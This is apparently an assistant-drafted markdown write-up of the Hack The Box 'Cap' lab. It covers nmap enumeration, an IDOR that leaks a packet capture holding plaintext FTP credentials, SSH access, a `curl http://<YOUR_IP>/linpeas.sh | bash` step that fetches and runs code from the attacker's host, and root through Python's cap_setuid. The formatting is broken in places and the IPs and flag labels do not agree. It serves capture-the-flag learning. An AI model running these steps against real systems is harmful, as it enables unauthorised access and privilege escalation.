
Here’s how you can add these images to the **Cap** write-up on your GitHub page. I'll integrate the images with captions in the appropriate places.

### Write-up: **Hack The Box - Cap**

#### **01-Enumeration.md**
```markdown
# Enumeration

## Nmap
Start with an nmap scan to check open ports and services:
```bash
nmap -sC -sV -Pn 10.129.219.24
```
**Results**:
- Open Ports: 21 (FTP), 22 (SSH), 80 (HTTP)

![Nmap Scan Results](https://github.com/user-attachments/assets/c6fb655e-c500-40e1-b10d-a3e90491c67e)
)

The HTTP service is running **Gunicorn**, a Python-based HTTP server. No anonymous FTP access is available.

## HTTP Service
Browsing the HTTP server shows a dashboard with network-related functionalities. Certain pages display the output of commands like `ifconfig` and `netstat`, indicating that system commands are being executed in the background.

![Web Dashboard](https://github.com/user-attachments/assets/a4522c59-b984-4c5a-b034-f333a8cd5287)
![Network Info on Web Dashboard](https://github.com/user-attachments/assets/b1433e2a-5252-43a3-9249-601240604ef2)
![Security Snap Shot User 1](https://github.com/user-attachments/assets/bdd14d07-a31e-48ef-a82b-4012c122dab8)

The usrl ends in a 1, there are two options both work. first you can just change the number to 0-2 etc and see what works. in this case changing the number to 0 will allow you to download a PCAP file which has infomration. Another method is to use `FFUF` and identify other account which might be accesed. below is the screen shot for what I used. 
![FFuF](https://github.com/user-attachments/assets/4943d366-defe-4745-91b8-12b9adea043a)


```

#### **02-Foothold.md**
```markdown
# Foothold

## Wireshark
```
Download the PCAP file for user 0 and run the following command
![Wireshark PCAP](https://github.com/user-attachments/assets/2ee7f46d-ebd7-44c5-a599-cedbdeed30c6)

```
## IDOR Exploit
While creating packet captures, the URL follows the pattern `/data/<id>`. Incrementing the `id` allows access to previous users’ packet captures, revealing a vulnerability known as **Insecure Direct Object Reference (IDOR)**.

Downloading the capture file at `/data/0` and opening it in WireShark reveals FTP traffic containing plaintext credentials:
- **Username**: `nathan`
- **Password**: `Buck3tH4TF0RM3!`
```
![Wireshark filter](https://github.com/user-attachments/assets/cf2555b2-771d-48b5-8d51-d2e62ce6b836)

```
## SSH Access
Use the credentials to log in via SSH:
```bash
ssh nathan@10.10.10.245
```


![ssh into nathan](https://github.com/user-attachments/assets/f897c07c-2217-4e2a-9558-95308262a22e)

You now have a foothold on the system.

if you run ls you will see at .txt file with user Flag
![user flag](https://github.com/user-attachments/assets/5b98e2a8-df1b-4b5f-a96c-0ac05d8fcd48)

```

#### **03-Privilege Escalation.md**
```markdown
# Privilege Escalation

## LinPEAS Scan
Run LinPEAS to find privilege escalation vectors. Download LinPEAS using a Python web server on your attacker machine:
```bash
sudo python3 -m http.server 80
```
Then, download and execute it from the target machine:
```bash
curl http://<YOUR_IP>/linpeas.sh | bash
```
left side is attacking computer and right is victim
![linpeas](https://github.com/user-attachments/assets/f33dae68-952f-4621-9b43-cc77e5cab4c2)


The scan reveals that `/usr/bin/python3.8` has the following capabilities:
- **cap_setuid**
- **cap_net_bind_service**

### Exploit Python Capabilities
The **cap_setuid** capability allows the Python interpreter to switch to UID 0 (root) without the SUID bit set.

![linpeas vuln](https://github.com/user-attachments/assets/a109be53-21f6-4fca-9dac-2e5091131851)

A quick google search of this vuln will reval how to exploit

![Exploit](https://github.com/user-attachments/assets/886247b0-47a5-4014-91ea-e5c2fb968ed4)

To exploit this, run the following Python commands to spawn a root shell:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
![root](https://github.com/user-attachments/assets/83d9291e-f265-47cf-a9c3-7e7345fb917d)

## User Flag
After escalating privileges, retrieve the `user.txt` flag:
```bash
cat user.txt
```

![root flag](https://github.com/user-attachments/assets/82cdae30-e33a-45dd-b1c9-dce7ee3a4094)

```

---

